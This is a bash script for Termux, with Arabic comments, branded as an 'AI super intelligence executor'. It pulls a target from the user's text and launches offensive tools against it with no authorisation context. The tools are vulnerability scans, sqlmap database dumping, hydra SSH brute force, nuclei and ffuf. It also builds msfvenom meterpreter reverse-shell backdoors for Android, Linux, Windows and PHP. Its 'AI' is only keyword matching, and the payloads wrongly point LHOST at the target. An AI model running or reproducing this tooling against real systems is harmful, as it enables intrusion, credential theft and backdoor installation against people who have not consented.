#!/data/data/com.termux/files/usr/bin/bash
# AI SUPER INTELLIGENCE EXECUTOR v313 - يفهم وينفذ ويحلل ويصلح

export PATH=$PATH:/usr/bin:/usr/sbin:/usr/local/bin:/data/data/com.termux/files/usr/bin
shopt -s extglob

# قراءة وتحليل الأمر
read -r -p "🤖 Dark Thorfin AI أمرك: " user_input

# معالجة ذكية للأمر
analyze_command() {
    local cmd="$1"
    
    # تحليل نوع الأمر
    if [[ "$cmd" =~ (فحص|scan|nmap|nikto|whatweb|wafw00f|sslscan) ]]; then
        echo "SCAN"
    elif [[ "$cmd" =~ (اختراق|exploit|hydra|sqlmap|brute|force) ]]; then
        echo "EXPLOIT"
    elif [[ "$cmd" =~ (بولد|payload|backdoor|reverse|shell) ]]; then
        echo "PAYLOAD"
    elif [[ "$cmd" =~ (تثبيت|install|setup|fix|missing|مفقود) ]]; then
        echo "INSTALL"
    elif [[ "$cmd" =~ (كل|all|جميع|كلها|full|complete) ]]; then
        echo "ALL"
    else
        echo "AUTO"
    fi
}

# تنفيذ الأدوات حسب التحليل
execute_tools() {
    local mode="$1"
    local target="$2"
    
    # تثبيت المفقودات تلقائياً
    if [[ "$mode" == "INSTALL" ]] || [[ "$mode" == "ALL" ]]; then
        echo "🔧 تثبيت الأدوات المفقودة..."
        pkg install -y hydra hashcat subfinder dnsx katana 2>/dev/null
        pip install dnsx subfinder katana 2>/dev/null
    fi
    
    # فحص شامل
    if [[ "$mode" == "SCAN" ]] || [[ "$mode" == "ALL" ]] || [[ "$mode" == "AUTO" ]]; then
        echo "🔍 بدء الفحص الشامل..."
        nmap -sV -sC -O --script=vuln "$target" -oN scan_results.txt &
        nikto -h "$target" -o nikto_report.txt &
        whatweb "$target" --log-verbose=whatweb.log &
        wafw00f "$target" -o waf_results.txt &
        sslscan "$target" > ssl_scan.txt &
        wait
    fi
    
    # اختراق وثغرات
    if [[ "$mode" == "EXPLOIT" ]] || [[ "$mode" == "ALL" ]]; then
        echo "💥 بدء الهجمات..."
        sqlmap -u "http://$target/index.php?id=1" --batch --dbs --dump &
        hydra -L users.txt -P pass.txt ssh://"$target" -t 4 -o hydra_results.txt &
        nuclei -u "https://$target" -severity critical,high -o nuclei_findings.txt &
        ffuf -u "http://$target/FUZZ" -w /usr/share/wordlists/dirb/common.txt -o ffuf_results.txt &
        wait
    fi
    
    # بيلودات
    if [[ "$mode" == "PAYLOAD" ]] || [[ "$mode" == "ALL" ]]; then
        echo "🧬 توليد البيلودات..."
        msfvenom -p android/meterpreter/reverse_tcp LHOST="$target" LPORT=4444 -o backdoor.apk &
        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$target" LPORT=4444 -f elf -o backdoor.elf &
        msfvenom -p windows/meterpreter/reverse_tcp LHOST="$target" LPORT=4444 -f exe -o backdoor.exe &
        msfvenom -p php/meterpreter_reverse_tcp LHOST="$target" LPORT=4444 -f raw -o shell.php &
        wait
    fi
    
    # تحليل النتائج
    echo "📊 تحليل النتائج..."
    if [ -f scan_results.txt ]; then
        echo "=== المنافذ المفتوحة ==="
        grep -E "^[0-9]+/tcp" scan_results.txt | awk '{print $1, $3}'
        echo "=== الثغرات ==="
        grep -i "vuln\|CVE\|VULNERABLE" scan_results.txt 2>/dev/null
    fi
    
    if [ -f hydra_results.txt ]; then
        echo "=== كلمات المرور المخترقة ==="
        grep -i "password\|login\|host:" hydra_results.txt 2>/dev/null
    fi
    
    if [ -f nuclei_findings.txt ]; then
        echo "=== ثغرات Nuclei ==="
        cat nuclei_findings.txt 2>/dev/null
    fi
}

# استخراج الهدف من الأمر
extract_target() {
    local cmd="$1"
    # البحث عن IP أو domain في الأمر
    echo "$cmd" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | head -1
}

# معالجة الأخطاء وإصلاحها
auto_fix() {
    local error="$1"
    echo "🛠️ إصلاح المشكلة: $error"
    
    # فحص وحل المشاكل الشائعة
    if ! command -v hydra &>/dev/null; then
        pkg install hydra -y
    fi
    if ! command -v hashcat &>/dev/null; then
        pkg install hashcat -y
    fi
    if ! command -v subfinder &>/dev/null; then
        go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
    fi
    
    # إصلاح المسارات
    export PATH="$HOME/go/bin:$PATH"
}

# MAIN EXECUTION
echo "🧠 Dark Thorfin AI - معالجة الأمر..."
echo "═══════════════════════════════════"

target=$(extract_target "$user_input")
mode=$(analyze_command "$user_input")

echo "📌 الوضع: $mode"
echo "🎯 الهدف: ${target:-تلقائي}"

# تنفيذ مع إصلاح تلقائي
if [[ -z "$target" ]]; then
    echo "⚠️ لم يتم تحديد هدف - استخدام الوضع المحلي"
    target="127.0.0.1"
fi

execute_tools "$mode" "$target" 2>&1 | tee execution_log.txt

# فحص الأخطاء وإصلاحها
if [ $? -ne 0 ]; then
    auto_fix "Execution error"
    execute_tools "$mode" "$target"
fi

# النتائج النهائية
echo ""
echo "✅ تم التنفيذ بنجاح"
echo "📁 النتائج في:"
ls -la *.txt *.log *.apk *.elf *.exe *.php 2>/dev/null || echo "لا توجد ملفات نتائج"

# رفع على GitHub تلقائياً
read -p "🔑 هل تريد رفع النتائج على GitHub؟ (y/n): " upload
if [[ "$upload" == "y" ]]; then
    read -p "GitHub Token: " token
    read -p "Username: " user
    repo="ai-executor-results-$(date +%s)"
    curl -s -u "$user:$token" https://api.github.com/user/repos -d "{\"name\":\"$repo\"}" > /dev/null
    git init; git add .; git commit -m "AI Execution Results $(date)"
    git remote add origin "https://$token@github.com/$user/$repo.git"
    git push -u origin master --force
    echo "✅ تم الرفع: https://github.com/$user/$repo"
fi
